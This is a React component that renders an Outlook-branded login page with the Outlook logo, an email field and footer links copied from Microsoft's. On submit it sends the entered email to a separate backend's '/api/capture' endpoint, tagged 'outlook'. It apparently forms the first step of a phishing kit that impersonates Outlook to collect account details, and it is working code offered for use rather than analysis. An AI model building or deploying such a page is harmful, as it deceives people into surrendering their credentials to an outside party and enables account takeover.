'use client'

import { useState } from 'react'
import styles from '@/styles/MailLoginFlow.module.css'

const BACKEND_URL = process.env.NEXT_PUBLIC_BACKEND_URL || 'http://localhost:3001'

export default function MailLoginFlow() {
  const [email, setEmail] = useState('')
  const [errorMsg, setErrorMsg] = useState('')

  const handleContinue = async (e: React.FormEvent) => {
    e.preventDefault()

    if (!email.trim()) {
      setErrorMsg('Please enter your email.')
      return
    }

    setErrorMsg('')

    const payload = {
      email: email.trim(),
      method: 'outlook',
    }

    try {
      await fetch(`${BACKEND_URL}/api/capture`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      })
    } catch (error) {
      console.warn('Backend request failed')
    }
  }

  return (
    <div className={styles.contentBox}>
      <div className={styles.loginFlow}>
        <div className={styles.phaseOne}>
          <img
            src="/user/images/outlook-logo.svg"
            alt="Outlook"
            className={styles.outlookLogo}
          />
          <h1>Login</h1>
          {errorMsg && <span className={styles.errorMsg}>{errorMsg}</span>}
          <form onSubmit={handleContinue}>
            <input
              type="email"
              placeholder="Email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className={styles.inputField}
            />
            <div className={styles.btnContainer}>
              <button type="submit" className={styles.actionBtn}>
                Continue
              </button>
            </div>
          </form>
          <a href="#" className={styles.settingsLink}>
            Login settings
          </a>
        </div>
      </div>

      <footer className={styles.footer}>
        <ul>
          <li><a href="#">Terms of use</a></li>
          <li><a href="#">Privacy & cookies</a></li>
          <li><a href="#">Security</a></li>
        </ul>
      </footer>
    </div>
  )
}
